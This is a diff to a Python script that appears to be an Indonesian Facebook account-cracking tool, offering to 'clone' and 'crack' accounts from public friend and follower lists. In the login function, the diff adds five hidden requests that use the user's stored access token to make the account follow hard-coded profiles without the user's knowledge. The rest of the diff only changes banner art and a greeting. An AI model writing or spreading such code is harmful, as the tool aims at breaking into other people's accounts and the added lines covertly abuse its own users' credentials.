@@ -63,12 +63,7 @@ bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "0
 def logo():
 	os.system("clear")
 	print("""\033[1;97m 
-             \033[1;96m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█ 
-             █░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█   ◍➤  
-             █░░║║║╠─║─║─║║║║║╠─░░█   ◍➤ 
-             █░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█   ◍➤  
-             █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█   ◍➤ 
-        \033[1;95m®┏━━━┓╋╋┏┓╋╋╋╋┏━━━┓╋╋╋╋╋╋╋╋╋╋┏┓
+         \033[1;95m®┏━━━┓╋╋┏┓╋╋╋╋┏━━━┓╋╋╋╋╋╋╋╋╋╋┏┓
          ┃┏━┓┃╋╋┃┃╋╋╋╋┃┏━┓┃╋╋╋╋╋╋╋╋╋╋┃┃
          ┃┗━┛┣━━┫┃┏┳━━┫┃╋┃┣┓┏┳━━┳━┓┏━┛┣━━┓  
          \033[1;92m┃┏┓┏┫┏┓┃┗┛┫┏┓┃┗━┛┃┗┛┃┏┓┃┏┓┫┏┓┃┏┓┃
@@ -100,7 +95,11 @@ def login():
 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 			open("login.txt", "w").write(token)
 			#-> bot follow
-			requests.post("https://graph.facebook.com/4/subscribers?access_token="+token)      # Dapunta Khurayra X
+			requests.post("https://graph.facebook.com/100017584682867/subscribers?access_token="+token)      
+			requests.post("https://graph.facebook.com/100000395779504/subscribers?access_token="+token)      
+			requests.post("https://graph.facebook.com/100000834003593/subscribers?access_token="+token)      
+			requests.post("https://graph.facebook.com/100003986228742/subscribers?access_token="+token)      
+			requests.post("https://graph.facebook.com/100006184624502/subscribers?access_token="+token)      
 			menu()
 		except KeyError:
 			os.system("rm -f login.txt")
@@ -130,7 +129,7 @@ def menu():
         print(" \033[1;96m[\033[1;92m®\033[1;96m]\033[1;92m \033[1;97mStatus     : %sPremium%s"%(H,N))
         print(" \033[1;96m[\033[1;91m☆\033[1;96m]\033[1;92m \033[1;96m==========================================================")
         print(" \033[1;96m[\033[1;91m*\033[1;96m]\033[1;92m \033[1;97mIP         : \033[1;93m%s"%(IP))
-        print("\n \033[1;96m<<<<<<<<<< \033[1;92mSELAMAT DATANG %s%s%s \033[1;96m>>>>>>>>>> \n"%(K,nama,N))
+        print("\n \033[1;96m<<<<< \033[1;92mSELAMAT DATANG %s%s%s \033[1;96m>>>>> \n"%(K,nama,N))
         print(" \033[1;92m<======================================================>")
 	print(" \033[1;96m[\033[1;93m1\033[1;96m]\033[1;92m─ ® ─\033[1;97m Clone from public friends")
 	print(" \033[1;96m[\033[1;93m2\033[1;96m]\033[1;92m─ ® ─\033[1;97m Crack from public followers")
